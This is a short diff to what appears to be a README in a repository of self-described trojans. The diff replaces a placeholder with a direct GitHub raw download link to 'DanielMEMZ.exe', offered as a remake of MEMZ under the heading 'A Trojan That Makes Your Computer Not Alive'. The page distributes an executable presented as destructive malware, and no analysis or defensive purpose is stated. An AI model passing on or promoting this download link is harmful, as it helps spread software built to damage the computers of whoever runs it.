@@ -15,6 +15,6 @@ A Trojan That Makes Your Computer "Not Alive"
 ***DanielMEMZ.exe***
 A Remake Of MEMZ.
 
-**V1:** [Download](eee.com)
+**V1:** [Download](https://github.com/DanielProfessional/DanielTrojans/raw/main/assets%20(do%20not%20touch)/trojans/DanielMEMZ/DanielMEMZ.exe)
 
 **V2:** [Coming Soon!](https://comingsoon.com)
